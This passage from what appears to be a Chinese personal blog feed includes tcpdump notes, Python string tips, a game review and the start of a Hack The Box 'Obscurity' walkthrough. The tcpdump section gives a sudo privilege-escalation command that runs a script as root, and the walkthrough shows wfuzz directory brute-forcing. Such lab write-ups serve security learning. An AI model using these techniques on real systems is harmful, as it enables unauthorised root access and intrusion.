      <link href="/posts/9cc474ce/"/>
      <url>/posts/9cc474ce/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>-i 指定网卡接口</li><li>-c 指定数量</li><li>-w 保存的文件名</li><li>-z 指定脚本</li><li>-Z 指定用户</li></ul><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump host 210.27.48.1</span><br></pre></td></tr></table></figure><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)</span><br></pre></td></tr></table></figure><p>截获主机hostname发送的所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 src host hostname</span><br></pre></td></tr></table></figure><p>监视所有送到主机的数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 dst host hostname</span><br></pre></td></tr></table></figure><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump tcp port 23 and host 210.27.48.1</span><br></pre></td></tr></table></figure><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump udp port 123</span><br></pre></td></tr></table></figure><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0&#x2F;24 -w .&#x2F;target.cap</span><br></pre></td></tr></table></figure><p>抓取http包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]&#x3D;0x4745 or tcp[20:2]&#x3D;0x4854</span><br></pre></td></tr></table></figure><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@webdeveloper:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> webdeveloper:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> webdeveloper on webdeveloper:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User webdeveloper may run the following commands on webdeveloper:</span><br><span class="line">    (root) /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure><p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;exploit -Z root</span><br></pre></td></tr></table></figure><blockquote><p>-z 指定脚本，-Z 指定用户身份</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcpdump </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何保护版权</title>
      <link href="/posts/3b32f749/"/>
      <url>/posts/3b32f749/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰气时代玩后感</title>
      <link href="/posts/69f21310/"/>
      <url>/posts/69f21310/</url>
      
        <content type="html"><![CDATA[<p>寒假正逢steam打折，一直放在愿望单中的冰气时代这会降价了，果断入坑</p><p>买来之后第一把就找不着北了，游戏的玩法还是比较简单，但是前期资源匮乏，我需要收集木炭和木材，我一开始并没有意识到，等我将木材耗尽之后发现没有地方可以收集木材了？？？周围倒是有一些冻树木，但是要建造伐木场才行，wtf???,这游戏难道就到头了？</p><p>之后去找了B站的教程，欸突然意识到原来黑乎乎的一团有些是煤堆，有些是木箱23333，采集木箱可以收集木材。哦这游戏居然可以这样玩啊。这还只是我遇到的第一个坑，后面还遇到了建房子要和道路相连，道路要和能量塔相连等等</p><p> 不过这个游戏设计的比较好的就是法律和不满值了，我一直很担心不满值会升高，但是有些法律又不得不的签署，比如童工，比如加班，如果不这样的话就导致资源收集的速度很慢，大部分时候收集到的煤炭一个晚上就耗完了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件</title>
      <link href="/posts/75a61507/"/>
      <url>/posts/75a61507/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python3字符串</title>
      <link href="/posts/25e898cd/"/>
      <url>/posts/25e898cd/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="性质判定"><a href="#性质判定" class="headerlink" title="性质判定"></a>性质判定</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isalnum()、isalpha()、isdigit()、islower()、isupper()、isspace()、istitle()、startswith(prefix[,start[, end]])、endswith(suffix[,start[, end]])</span><br></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count( sub[, start[, end]])、find( sub[, start[,end]])、index( sub[, start[, end]])、rfind( sub[, start[,end]])、rindex(sub[, start[, end]])</span><br></pre></td></tr></table></figure><p>注意find()和index()方法的不同：find()函数族找不到时返回-1，index()函数族则抛出ValueError异常。</p><p>但是对于判定是否包含字串的判定推荐用  <code>in</code> 和 <code>not in</code>操作符</p><p><code>replace(old, new[,count])</code>用以替换字符串的某些子串，如果指定count参数的话，就最多替换count次，如果不指定，就全部替换</p><h3 id="分切和连接"><a href="#分切和连接" class="headerlink" title="分切和连接"></a>分切和连接</h3><p><code>partition()</code> 和 <code>split</code> </p><p>split举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">' hello     world'</span>.split()</span><br><span class="line">[<span class="string">'hello'</span>, <span class="string">'world'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">' hello     world'</span>.split(<span class="string">' '</span>)  <span class="comment"># 要注意第一种方式和第二种方式不一样</span></span><br><span class="line">[<span class="string">''</span>, <span class="string">'hello'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'world'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">' hello     world'</span>.split(<span class="string">''</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: empty separator</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.split()</span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.split(<span class="string">' '</span>)</span><br><span class="line">[<span class="string">''</span>]</span><br></pre></td></tr></table></figure><h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lower()、upper()、capitalize()、swapcase()、title()</span><br></pre></td></tr></table></figure><h3 id="删减与填充"><a href="#删减与填充" class="headerlink" title="删减与填充"></a>删减与填充</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strip([chars])、lstrip([chars])、rstrip([chars])</span><br><span class="line"></span><br><span class="line">center(width[, fillchar])、ljust(width[,fillchar])、rjust(width[, fillchar])、zfill(width)、expandtabs([tabsize])</span><br></pre></td></tr></table></figure><p>这些方法中的fillchar参数是指用以填充的字符，默认是空格。而zfill()中的z是指zero，所以顾名思义，zfill()即是以字符0进行填充，在输出数值时比较常用。expandtabs()的tabsize参数默认为8，它的功能是把字符串中的制表符（tab）转换为适当数量的空格。</p><h2 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: name = <span class="string">"pxy"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="string">f'Hello, my name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'Hello, my name is pxy'</span></span><br></pre></td></tr></table></figure><p>求值运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: &gt;&gt;&gt; <span class="string">f'Complex number <span class="subst">&#123;(<span class="number">2</span> + <span class="number">2j</span>) / (<span class="number">2</span> - <span class="number">3j</span>)&#125;</span>'</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">'Complex number (-0.15384615384615388+0.7692307692307692j)'</span></span><br><span class="line">    </span><br><span class="line">In [<span class="number">6</span>]: <span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="string">f'The answer is <span class="subst">&#123;math.log(math.pi)&#125;</span>'</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="string">'The answer is 1.1447298858494002</span></span><br></pre></td></tr></table></figure><p>f-string大括号内也可填入lambda表达式，但lambda表达式的 <code>:</code> 会被f-string误认为是表达式与格式描述符之间的分隔符，为避免歧义，需要将lambda表达式置于括号 <code>()</code> 内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="string">f'result is <span class="subst">&#123;(<span class="keyword">lambda</span> x: x ** <span class="number">2</span> + <span class="number">1</span>) (<span class="number">2</span>)&#125;</span>'</span></span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">'result is 5'</span></span><br></pre></td></tr></table></figure><h2 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h2><h3 id="str转bytes"><a href="#str转bytes" class="headerlink" title="str转bytes"></a>str转bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">23</span>]: bytes(a, encoding=<span class="string">"gbk"</span>)</span><br><span class="line">Out[<span class="number">23</span>]: <span class="string">b'\xb0\xd9\xb6\xc8'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: bytes(a, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">b'\xe7\x99\xbe\xe5\xba\xa6'</span></span><br></pre></td></tr></table></figure><h3 id="从十六进制转化为bytes"><a href="#从十六进制转化为bytes" class="headerlink" title="从十六进制转化为bytes"></a>从十六进制转化为bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: a = <span class="string">'aabbccddeeff'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: a_bytes = bytes.fromhex(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: a_bytes</span><br><span class="line">Out[<span class="number">41</span>]: <span class="string">b'\xaa\xbb\xcc\xdd\xee\xff'</span></span><br></pre></td></tr></table></figure><h3 id="从bytes转化为十六进制"><a href="#从bytes转化为十六进制" class="headerlink" title="从bytes转化为十六进制"></a>从bytes转化为十六进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">42</span>]: a_bytes</span><br><span class="line">Out[<span class="number">42</span>]: <span class="string">b'\xaa\xbb\xcc\xdd\xee\xff'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">43</span>]: a_bytes.hex()</span><br><span class="line">Out[<span class="number">43</span>]: <span class="string">'aabbccddeeff'</span></span><br></pre></td></tr></table></figure><h3 id="base64编码byets"><a href="#base64编码byets" class="headerlink" title="base64编码byets"></a>base64编码byets</h3><p>python3的base64包的 <code>b64encode</code> 只能使用 bytes 类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如我们要编码 \xac\xed</span></span><br><span class="line">In [<span class="number">54</span>]: a = <span class="string">"aced"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: a = bytes.fromhex(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">56</span>]: a</span><br><span class="line">Out[<span class="number">56</span>]: <span class="string">b'\xac\xed'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">57</span>]: base64.b64encode(a)</span><br><span class="line">Out[<span class="number">57</span>]: <span class="string">b'rO0='</span></span><br></pre></td></tr></table></figure><h3 id="md5加密bytes"><a href="#md5加密bytes" class="headerlink" title="md5加密bytes"></a>md5加密bytes</h3><p>python3 只能用hashlib中的md5函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = hashlib.md5()</span><br><span class="line">a.update(<span class="string">b"pxy"</span>)</span><br><span class="line">a.hexdigest()</span><br></pre></td></tr></table></figure><p>封装一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genearteMD5</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Tips</span></span><br><span class="line">    <span class="comment"># 此处必须声明encode</span></span><br><span class="line">    <span class="comment"># 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing</span></span><br><span class="line">    hl.update(str.encode(encoding=<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'MD5加密前为 ：'</span> + str)</span><br><span class="line">    print(<span class="string">'MD5加密后为 ：'</span> + hl.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h2><h3 id="判断字符串是否为空"><a href="#判断字符串是否为空" class="headerlink" title="判断字符串是否为空"></a>判断字符串是否为空</h3><p>用 <code>a == None</code> 是不行的</p><p>可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> a.strip() == <span class="string">""</span>:</span><br><span class="line">print(<span class="string">"a is null"</span>)</span><br></pre></td></tr></table></figure><h3 id="list和str转换"><a href="#list和str转换" class="headerlink" title="list和str转换"></a>list和str转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: a = <span class="string">"aaaafasfasd"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: list(a)</span><br><span class="line">Out[<span class="number">18</span>]: [<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'f'</span>, <span class="string">'a'</span>, <span class="string">'s'</span>, <span class="string">'f'</span>, <span class="string">'a'</span>, <span class="string">'s'</span>, <span class="string">'d'</span>]</span><br></pre></td></tr></table></figure><h3 id="固定长度分割字符串"><a href="#固定长度分割字符串" class="headerlink" title="固定长度分割字符串"></a>固定长度分割字符串</h3><p>传统上一般是遍历</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_width_split</span><span class="params">(string, width)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [string[x : x + width] <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(string), width)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> fix_width_split(<span class="string">'123456789'</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>但是如果有了正则，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">string = <span class="string">'123456789'</span></span><br><span class="line">split = re.findall(<span class="string">r'.&#123;7&#125;'</span>, string)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">76</span>]: string = <span class="string">'123456789'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">77</span>]: split = re.findall(<span class="string">".&#123;3&#125;"</span>, string)</span><br><span class="line"></span><br><span class="line">In [<span class="number">78</span>]: split</span><br><span class="line">Out[<span class="number">78</span>]: [<span class="string">'123'</span>, <span class="string">'456'</span>, <span class="string">'789'</span>]</span><br></pre></td></tr></table></figure><h3 id="bytes写入文件"><a href="#bytes写入文件" class="headerlink" title="bytes写入文件"></a>bytes写入文件</h3><p>以二进制方式打开即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693" target="_blank" rel="noopener">python格式化字符串f-string</a></p><p><a href="https://www.40huo.cn/blog/python-string-tricks.html" target="_blank" rel="noopener">python字符串trick</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> bytes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Obscurity靶机实战</title>
      <link href="/posts/a0911a0b/"/>
      <url>/posts/a0911a0b/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.168 obscure.htb</span><br></pre></td></tr></table></figure><p>扫描端口发现开放了 <code>8080</code> 的web端口</p><p>页面提示有一个源码泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</span><br></pre></td></tr></table></figure><p>那我们就需要爆破目录了</p><p>使用 <code>wfuzz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/a0911a0b/1580912401299.png" alt></p><p>得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">respTemplate = <span class="string">"""HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">DOC_ROOT = <span class="string">"DocRoot"</span></span><br><span class="line"></span><br><span class="line">CODES = &#123;<span class="string">"200"</span>: <span class="string">"OK"</span>, </span><br><span class="line">        <span class="string">"304"</span>: <span class="string">"NOT MODIFIED"</span>,</span><br><span class="line">        <span class="string">"400"</span>: <span class="string">"BAD REQUEST"</span>, <span class="string">"401"</span>: <span class="string">"UNAUTHORIZED"</span>, <span class="string">"403"</span>: <span class="string">"FORBIDDEN"</span>, <span class="string">"404"</span>: <span class="string">"NOT FOUND"</span>, </span><br><span class="line">        <span class="string">"500"</span>: <span class="string">"INTERNAL SERVER ERROR"</span>&#125;</span><br><span class="line"></span><br><span class="line">MIMES = &#123;<span class="string">"txt"</span>: <span class="string">"text/plain"</span>, <span class="string">"css"</span>:<span class="string">"text/css"</span>, <span class="string">"html"</span>:<span class="string">"text/html"</span>, <span class="string">"png"</span>: <span class="string">"image/png"</span>, <span class="string">"jpg"</span>:<span class="string">"image/jpg"</span>, </span><br><span class="line">        <span class="string">"ttf"</span>:<span class="string">"application/octet-stream"</span>,<span class="string">"otf"</span>:<span class="string">"application/octet-stream"</span>, <span class="string">"woff"</span>:<span class="string">"font/woff"</span>, <span class="string">"woff2"</span>: <span class="string">"font/woff2"</span>, </span><br><span class="line">        <span class="string">"js"</span>:<span class="string">"application/javascript"</span>,<span class="string">"gz"</span>:<span class="string">"application/zip"</span>, <span class="string">"py"</span>:<span class="string">"text/plain"</span>, <span class="string">"map"</span>: <span class="string">"application/octet-stream"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">"%a, %d %b %Y %H:%M:%S"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.format(**self.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">         